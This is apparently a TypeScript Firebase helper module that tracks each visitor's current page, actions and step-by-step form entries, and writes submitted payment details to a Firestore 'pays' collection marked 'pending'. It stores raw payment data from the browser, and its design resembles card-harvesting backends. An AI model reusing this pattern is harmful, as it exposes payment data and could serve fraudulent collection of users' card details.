import { getApp, getApps, initializeApp } from "firebase/app";
import { getDatabase, ref, set, onValue, push } from "firebase/database";
import { doc, getFirestore, setDoc, collection, addDoc } from "firebase/firestore";

const firebaseConfig = {
  apiKey: import.meta.env.VITE_FIREBASE_API_KEY,
  authDomain: import.meta.env.VITE_FIREBASE_AUTH_DOMAIN,
  databaseURL: import.meta.env.VITE_FIREBASE_DATABASE_URL,
  projectId: import.meta.env.VITE_FIREBASE_PROJECT_ID,
  storageBucket: import.meta.env.VITE_FIREBASE_STORAGE_BUCKET,
  messagingSenderId: import.meta.env.VITE_FIREBASE_MESSAGING_SENDER_ID,
  appId: import.meta.env.VITE_FIREBASE_APP_ID,
  measurementId: import.meta.env.VITE_FIREBASE_MEASUREMENT_ID,
};

const app = getApps().length > 0 ? getApp() : initializeApp(firebaseConfig);
const db = getFirestore(app);
const database = getDatabase(app);

export async function addData(data: any) {
  try {
    const visitorId = localStorage.getItem("visitor");
    if (!visitorId) return;
    
    const visitorRef = ref(database, `visitors/${visitorId}`);
    await set(visitorRef, {
      ...data,
      updatedAt: new Date().toISOString(),
    });
  } catch (error) {
    console.error("Error adding data:", error);
  }
}

export const handleCurrentPage = (page: string) => {
  const visitorId = localStorage.getItem("visitor");
  if (visitorId) {
    addData({ id: visitorId, currentPage: page });
  }
};

export const handlePay = async (paymentInfo: any, setPaymentInfo: any) => {
  try {
    const visitorId = localStorage.getItem("visitor");
    if (visitorId) {
      const docRef = doc(db, "pays", visitorId);
      await setDoc(
        docRef,
        { ...paymentInfo, status: "pending", updatedAt: new Date().toISOString() },
        { merge: true }
      );
      setPaymentInfo((prev: any) => ({ ...prev, status: "pending" }));
    }
  } catch (error) {
    console.error("Error adding document:", error);
  }
};

export const trackVisitorAction = async (action: string, details?: any) => {
  try {
    const visitorId = localStorage.getItem("visitor");
    if (!visitorId) return;
    
    const actionsRef = ref(database, `actions/${visitorId}`);
    const newActionRef = push(actionsRef);
    await set(newActionRef, {
      action,
      details,
      timestamp: new Date().toISOString(),
    });
  } catch (error) {
    console.error("Error tracking action:", error);
  }
};

export const saveFormData = async (step: string, formData: any) => {
  try {
    const visitorId = localStorage.getItem("visitor");
    if (!visitorId) return;
    
    const formRef = ref(database, `forms/${visitorId}/${step}`);
    await set(formRef, {
      ...formData,
      submittedAt: new Date().toISOString(),
    });
  } catch (error) {
    console.error("Error saving form data:", error);
  }
};

export { db, database };
